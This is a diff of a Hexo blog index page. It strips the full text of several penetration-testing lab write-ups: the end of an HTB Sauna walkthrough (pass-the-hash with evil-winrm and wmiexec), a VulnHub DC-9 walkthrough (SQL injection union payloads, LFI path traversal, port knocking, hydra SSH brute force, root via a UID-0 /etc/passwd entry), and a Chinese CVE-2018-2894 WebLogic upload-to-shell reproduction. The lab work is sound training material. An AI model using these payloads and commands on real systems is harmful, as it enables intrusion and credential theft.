-<h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>evil-winrm</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.175 -u Administator -H 823452073d75b9d1cf70ebdf86c7f98e</span><br></pre></td></tr></table></figure>
-
-<p>wmiexec</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec -hashes &#x27;aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e&#x27; -dc-ip 10.10.10.175 administrator@10.10.10.175</span><br></pre></td></tr></table></figure>
-
-<p>or using other ways.</p>
-<p>Finally get root.txt</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\users\administrator\desktop&gt;type root.txt</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
+          <h1 id="Sauna"><a href="#Sauna" class="headerlink" title="Sauna"></a>Sauna</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/undefined/55527558.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -607,7 +422,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-09-27 21:02:10" itemprop="dateModified" datetime="2024-09-27T21:02:10+08:00">2024-09-27</time>
+                <time title="修改时间：2024-09-27 21:10:42" itemprop="dateModified" datetime="2024-09-27T21:10:42+08:00">2024-09-27</time>
               </span>
 
           
@@ -621,134 +436,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="VULHUB-DC09-Walkthrough"><a href="#VULHUB-DC09-Walkthrough" class="headerlink" title="VULHUB-DC09-Walkthrough"></a>VULHUB-DC09-Walkthrough</h1><h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><p>DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>
-<p>The ultimate goal of this challenge is to get root and to read the one and only flag.</p>
-<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>
-<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h3><p>Firstly ,we should konw target’s IP.So we use nmap to detect it.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$nmap -sn 192.168.137.0/24                                                                                                            </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 21:17 CST</span><br><span class="line">Nmap scan report for 192.168.137.2</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line">Nmap scan report for 192.168.137.3</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line">Nmap scan report for 192.168.137.4</span><br><span class="line">Host is up (0.00039s latency).</span><br><span class="line">Nmap done: 256 IP addresses (3 hosts up) scanned in 4.14 seconds</span><br></pre></td></tr></table></figure>
-
-<p>And now we know it was 192.168.137.4.</p>
-<h3 id="Port-x2F-Service"><a href="#Port-x2F-Service" class="headerlink" title="Port&#x2F;Service"></a>Port&#x2F;Service</h3><p>Time to run a TCP-SYN scan to scan for open TCP ports on targets:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -p- 192.168.137.4    -oN dc9-tcp-nmap-1</span><br></pre></td></tr></table></figure>
-
-<p>And we get such a result:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">                                                                                          </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 21:34 CST</span><br><span class="line">Nmap scan report for 192.168.137.4</span><br><span class="line">Host is up (0.000071s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp filtered  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:10:DF:0B (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.29 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>Then try to get more details for this two ports.Port 22 is filtered.Maybe there is a <strong>Port Knock</strong>.To tell the truth,i know that after searching in the Internet.Port 80 is open,so we can go web pentest later.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -p22,80 192.168.137.4 -oN dc9-tcp-nmap-2</span><br><span class="line">PORT   STATE  SERVICE VERSION</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open   http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-title: Example.com - Staff Details - Welcome</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.68 seconds</span><br></pre></td></tr></table></figure>
-
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">namp -sV --script=vuln -p22,80 192.168.137.4</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 21:41 CST</span><br><span class="line">Nmap scan report for 192.168.137.4</span><br><span class="line">Host is up (0.00036s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open   http</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-enum: </span><br><span class="line">|   /css/: Potentially interesting directory w/ listing on &#x27;apache/2.4.38 (debian)&#x27;</span><br><span class="line">|_  /includes/: Potentially interesting directory w/ listing on &#x27;apache/2.4.38 (debian)&#x27;</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.137.4</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.137.4:80/search.php</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: results.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.137.4:80/manage.php</span><br><span class="line">|     Form id: </span><br><span class="line">|_    Form action: manage.php</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 31.20 seconds</span><br></pre></td></tr></table></figure>
-
-<p>Now,we get some information about target like <code>results.php</code>,<code>manage.php</code>,etc.</p>
-<h2 id="Web-pentest"><a href="#Web-pentest" class="headerlink" title="Web pentest"></a>Web pentest</h2><p>go web scan</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u 192.168.137.4 -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt           </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.3</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.137.4</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.3</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2023/04/12 21:44:17 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.php            (Status: 200) [Size: 917]</span><br><span class="line">/search.php           (Status: 200) [Size: 1091]</span><br><span class="line">/config.php           (Status: 200) [Size: 0]</span><br><span class="line">/.htaccess            (Status: 403) [Size: 278]</span><br><span class="line">/logout.php           (Status: 302) [Size: 0] [--&gt; manage.php]</span><br><span class="line">/.                    (Status: 200) [Size: 917]</span><br><span class="line">/.html                (Status: 403) [Size: 278]</span><br><span class="line">/results.php          (Status: 200) [Size: 1056]</span><br><span class="line">/.php                 (Status: 403) [Size: 278]</span><br><span class="line">/manage.php           (Status: 200) [Size: 1210]</span><br><span class="line">/display.php          (Status: 200) [Size: 2961]</span><br><span class="line">/welcome.php          (Status: 302) [Size: 0] [--&gt; manage.php]</span><br><span class="line">/.htpasswd            (Status: 403) [Size: 278]</span><br><span class="line">/.htm                 (Status: 403) [Size: 278]</span><br><span class="line">/session.php          (Status: 302) [Size: 0] [--&gt; manage.php]</span><br><span class="line">/.htpasswds           (Status: 403) [Size: 278]</span><br><span class="line">/.htgroup             (Status: 403) [Size: 278]</span><br><span class="line">/wp-forum.phps        (Status: 403) [Size: 278]</span><br><span class="line">/.htaccess.bak        (Status: 403) [Size: 278]</span><br><span class="line">/.htuser              (Status: 403) [Size: 278]</span><br><span class="line">/.ht                  (Status: 403) [Size: 278]</span><br><span class="line">/.htc                 (Status: 403) [Size: 278]</span><br><span class="line">/.htaccess.old        (Status: 403) [Size: 278]</span><br><span class="line">/.htacess             (Status: 403) [Size: 278]</span><br><span class="line">Progress: 20866 / 37051 (56.32%)[ERROR] 2023/04/12 21:44:19 [!] parse &quot;http://192.168.137.4/directory\t\te.g.&quot;: net/url: invalid control character in URL</span><br><span class="line">Progress: 35281 / 37051 (95.22%)===============================================================</span><br><span class="line">2023/04/12 21:44:20 Finished</span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure>
-
-<p>Some interesting files were finded.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/index.php            (Status: 200) [Size: 917]</span><br><span class="line">/session.php          (Status: 302) [Size: 0] [--&gt; manage.php]</span><br><span class="line">/search.php           (Status: 200) [Size: 1091]</span><br><span class="line">/config.php           (Status: 200) [Size: 0]</span><br><span class="line">/logout.php           (Status: 302) [Size: 0] [--&gt; manage.php]</span><br><span class="line">/.                    (Status: 200) [Size: 917]</span><br><span class="line">/results.php          (Status: 200) [Size: 1056]</span><br><span class="line">/manage.php           (Status: 200) [Size: 1210]</span><br><span class="line">/display.php          (Status: 200) [Size: 2961]</span><br><span class="line">/welcome.php          (Status: 302) [Size: 0] [--&gt; manage.php]</span><br></pre></td></tr></table></figure>
-
-<p>So,let try them.</p>
-<p>And when try session.php,in the response packet,we found it’s set-Cookie.</p>
-<img src="/undefined/50abf7e1/image-20230412215235471.png" class="">
-
-<p>So,i try to add it to request packet to login into the manage.php.And,you guess what,it success.</p>
-<img src="/undefined/50abf7e1/image-20230412215351703.png" class="">
-
-<p>Then,we find some text in this page<em>File does not exist</em>.So i wonder if there a LFI?And finally get it .</p>
-<img src="/undefined/50abf7e1/image-20230412215538449.png" class="">
-
-<p>Dump the username in localfile.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor</span><br><span class="line">janitor2</span><br></pre></td></tr></table></figure>
-
-<p>Then , I find a attack point in <strong>results.php</strong>,and that was SQL injection.</p>
-<p>Firstly,i try.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A&#x27; or 1=1;#</span><br></pre></td></tr></table></figure>
-
-<img src="/undefined/50abf7e1/image-20230412220042466.png" class="">
-
-<p>So i continue with <strong>union</strong>.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A&#x27; union select 1,2,3,4,5,6;#</span><br></pre></td></tr></table></figure>
-
-<img src="/undefined/50abf7e1/image-20230412220335949.png" class="">
-
-<p>After test,i find it can’t Display multiple lines of information.So we can use <em>group_concat()</em> to bypass that.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A&#x27; union select 1,2,3,4,5,group_concat(0x7e,schema_name,0x7e) from information_schema.schemata</span><br></pre></td></tr></table></figure>
-
-<img src="/undefined/50abf7e1/image-20230412221247878.png" class="">
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A&#x27; union select 1,2,3,4,5,(select group_concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=database());#</span><br></pre></td></tr></table></figure>
-
-<img src="/undefined/50abf7e1/image-20230412220902699.png" class="">
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A&#x27; union select 1,2,3,4,5,group_concat(0x7e,username,0x7e,password,0x7e) from users.UserDetails;#</span><br></pre></td></tr></table></figure>
-
-<img src="/undefined/50abf7e1/image-20230412221104078.png" class="">
-
-<p>dump password in localfile.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">3kfs86sfd</span><br><span class="line">468sfdfsd2</span><br><span class="line">4sfd87sfd1</span><br><span class="line">RocksOff</span><br><span class="line">TC&amp;TheBoyz</span><br><span class="line">B8m#48sd</span><br><span class="line">Pebbles</span><br><span class="line">BamBam01</span><br><span class="line">UrAG0D!</span><br><span class="line">Passw0rd</span><br><span class="line">yN72#dsd</span><br><span class="line">ILoveRachel</span><br><span class="line">3248dsds7s</span><br><span class="line">smellycats</span><br><span class="line">YR3BVxxxw87</span><br><span class="line">Ilovepeepee</span><br></pre></td></tr></table></figure>
-
-<h2 id="Port-Knocking"><a href="#Port-Knocking" class="headerlink" title="Port Knocking"></a>Port Knocking</h2><p>Remember the filtered SSH port which might indicated a Port Knocking  method is used? As we now have access to the file system of our target,  we can try to locate the <em>knockd.conf</em> configuration file located by default at <em>&#x2F;etc&#x2F;</em> folder. This means our URL should be:<br> <code>http://192.168.137.4/manage.php?file=../../../../../../../../etc/knockd.conf</code></p>
-<img src="/undefined/50abf7e1/image-20230412221532885.png" class="">
-
-<p>Now we know the order of ports we need to hit with SYN packets in order  to open the SSH port - 7469,8475 and lastly 9842 port. Keep in mind the  order is important!</p>
-<p>We can use on of the follwoing methods:</p>
-<ol>
-<li><p><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/knockd">knockd</a> - Need to be installed.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">knock 192.168.137.4 7469 8475 9842</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://tools.kali.org/information-gathering/hping3">hping3</a> - pre-instlled on Kali. Use the following command to send 1 SYN packet to each port:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -S 10.0.0.235 -p 7469 -c 1; hping3 -S 10.0.0.235 -p 8475 -c 1; hping3 -S 10.0.0.235 -p 9842 -c 1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Netcat">netcat</a> - I’ll use this method as it is (manual but) easy.<br>We need to hit the port and CTRL+C in order to end the connection and move over to the next port.</p>
-</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.137.4 7469</span><br><span class="line">nc 192.168.137.4 8475 </span><br><span class="line">nc 192.168.137.4 9842 </span><br></pre></td></tr></table></figure>
-
-<p>then port 22 is open.</p>
-<h2 id="SSH-brute"><a href="#SSH-brute" class="headerlink" title="SSH brute"></a>SSH brute</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hydra -L username -P password ssh://192.168.137.4</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.137.4   login: chandlerb   password: UrAG0D!                                                                       </span><br><span class="line">[22][ssh] host: 192.168.137.4   login: joeyt   password: Passw0rd                                                                          [22][ssh] host: 192.168.137.4   login: janitor   password: Ilovepeepee</span><br></pre></td></tr></table></figure>
-
-<p>Got three valid username:password.</p>
-<p>ssh login.And we find new passoword when i login as janitor in <code>/home/janitor/.secrets-for-putin/passwords-found-on-post-it-notes.txt</code>.Then add it to password file.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">3kfs86sfd</span><br><span class="line">468sfdfsd2</span><br><span class="line">4sfd87sfd1</span><br><span class="line">RocksOff</span><br><span class="line">TC&amp;TheBoyz</span><br><span class="line">B8m#48sd</span><br><span class="line">Pebbles</span><br><span class="line">BamBam01</span><br><span class="line">UrAG0D!</span><br><span class="line">Passw0rd</span><br><span class="line">yN72#dsd</span><br><span class="line">ILoveRachel</span><br><span class="line">3248dsds7s</span><br><span class="line">smellycats</span><br><span class="line">YR3BVxxxw87</span><br><span class="line">Ilovepeepee</span><br><span class="line">Hawaii-Five-0</span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic#10-4</span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure>
-
-<p>back to brute.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hydra -L username -P password ssh://192.168.137.4</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.137.4   login: chandlerb   password: UrAG0D!                                                                       </span><br><span class="line">[22][ssh] host: 192.168.137.4   login: joeyt   password: Passw0rd                                                                          [22][ssh] host: 192.168.137.4   login: janitor   password: Ilovepeepee</span><br><span class="line">[22][ssh] host: 192.168.137.4   login: fredf   password: B4-Tru3-001</span><br></pre></td></tr></table></figure>
-
-<h2 id="Privilege-up"><a href="#Privilege-up" class="headerlink" title="Privilege up"></a>Privilege up</h2><p>uh,a new one.login and <code>sudo -l</code>.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff$ sudo -l</span><br><span class="line">Matching Defaults entries for fredf on dc-9:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User fredf may run the following commands on dc-9:</span><br><span class="line">    (root) NOPASSWD: /opt/devstuff/dist/test/test</span><br></pre></td></tr></table></figure>
-
-<p>run it ,get some hint.</p>
-<img src="/undefined/50abf7e1/image-20230412222508505.png" class="">
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -name &quot;test.py&quot; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/opt/devstuff/test.py</span><br><span class="line">/usr/lib/python3/dist-packages/setuptools/command/test.py</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/devstuff/test.py</span><br></pre></td></tr></table></figure>
-
-<img src="/undefined/50abf7e1/image-20230412222646923.png" class="">
-
-<p>this python script achieve a file read file write function.we can use it to add a root use to &#x2F;etc&#x2F;passwd.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt salt passwd</span><br><span class="line">$1$salt$XsMd08sxGRHdyFYPZh/w01</span><br></pre></td></tr></table></figure>
-
-<p>In order to stay aligned with <code>/etc/passwd</code> file format, we need to add some extra details:</p>
-<ul>
-<li>username - <code>so1</code> in this case</li>
-<li>salted + hashed password - the string created by openssl</li>
-<li>UID - as we want to create root, we need to use <code>0</code></li>
-<li>GID - same as for UID</li>
-<li>home directory - we’ll use <code>/root</code></li>
-<li>shell - I prefer <code>bash</code>, you can also use <code>sh</code></li>
-</ul>
-<p>Which leave us with the following file content:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /tmp/my_user `so1:$1$salt$XsMd08sxGRHdyFYPZh/w01:0:0::/root:/bin/bash` </span><br></pre></td></tr></table></figure>
-
-<p>Now we can execute the *<strong>test*</strong> script as sudo<br> <code>sudo ./test /tmp/my_user /etc/passwd</code></p>
-<p>cat &#x2F;etc&#x2F;passwd to verify user was added</p>
-<img src="/undefined/50abf7e1/image-20230412223022323.png" class="">
-
-<p>Switch to the new user and verify we’re root.</p>
-<img src="/undefined/50abf7e1/image-20230412223057976.png" class="">
-
-<p>get proof</p>
-<img src="/undefined/50abf7e1/proof.png" class="">
+          <h1 id="VULHUB-DC09-Walkthrough"><a href="#VULHUB-DC09-Walkthrough" class="headerlink" title="VULHUB-DC09-Walkthrough"></a>VULHUB-DC09-Walkthrough</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/undefined/50abf7e1.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -798,7 +494,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-09-27 21:02:10" itemprop="dateModified" datetime="2024-09-27T21:02:10+08:00">2024-09-27</time>
+                <time title="修改时间：2024-09-27 21:10:06" itemprop="dateModified" datetime="2024-09-27T21:10:06+08:00">2024-09-27</time>
               </span>
 
           
@@ -812,32 +508,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="CVE-2018-2894-weblogic-任意文件上传-复现"><a href="#CVE-2018-2894-weblogic-任意文件上传-复现" class="headerlink" title="CVE-2018-2894-weblogic-任意文件上传-复现"></a>CVE-2018-2894-weblogic-任意文件上传-复现</h1><h2 id="0x00漏洞简介"><a href="#0x00漏洞简介" class="headerlink" title="0x00漏洞简介"></a>0x00漏洞简介</h2><p>Web Service Test Page 开启的情况下，攻击者可以利用<code>http://your-ip:7001/ws_utc/config.do</code>进行当前工作目录设置，并进行任意文件上传getshell</p>
-<h2 id="0x01适用版本"><a href="#0x01适用版本" class="headerlink" title="0x01适用版本"></a>0x01适用版本</h2><p>Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3</p>
-<h2 id="0x02适用条件"><a href="#0x02适用条件" class="headerlink" title="0x02适用条件"></a>0x02适用条件</h2><p>Web Service Test Page 开启。</p>
-<p>而该功能在“生产模式“下默认不开启</p>
-<h2 id="0x03漏洞复现"><a href="#0x03漏洞复现" class="headerlink" title="0x03漏洞复现"></a>0x03漏洞复现</h2><p>漏洞环境：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894">https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894</a></p>
-<p>1.搭建环境</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d #起docker </span><br><span class="line">docker-compose logs|grep password #查看密码  默认用户weblogic</span><br></pre></td></tr></table></figure>
-
-<p>登录管理后台后，在<code>base_domain</code>的高级选项中开启Web Service Test Page功能</p>
-<img src="/undefined/e5c928a0/image-20230411154255728.png" class="">
-
-<p>2.上传文件</p>
-<p>访问<code>http://your-ip:7001/ws_utc/config.do</code>，进入以下界面</p>
-<img src="/undefined/e5c928a0/image-20230411154423227.png" class="">
-
-<p>设置当前工作目录为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>，<strong>静态目录css访问无需权限</strong>。</p>
-<img src="/undefined/e5c928a0/image-20230411154539372.png" class="">
-
-<p>上传文件后，通过抓包，我们可以获取文件名字和时间戳</p>
-<img src="/undefined/e5c928a0/image-20230411154622462.png" class="">
-
-<p>接着我们便可以通过上传的文件getshell，访问<code>http://your-ip:7001/ws_utc/config/css/keystore/[时间戳]_[文件名]</code></p>
-<img src="/undefined/e5c928a0/image-20230411154824798.png" class="">
-
-<h2 id="0x04漏洞修复"><a href="#0x04漏洞修复" class="headerlink" title="0x04漏洞修复"></a>0x04漏洞修复</h2><p>及时更新版本，安装版本补丁</p>
-
+          <h1 id="CVE-2018-2894-weblogic-任意文件上传-复现"><a href="#CVE-2018-2894-weblogic-任意文件上传-复现" class="headerlink" title="CVE-2018-2894-weblogic-任意文件上传-复现"></a>CVE-2018-2894-weblogic-任意文件上传-复现</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/undefined/e5c928a0.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -887,7 +566,7 @@
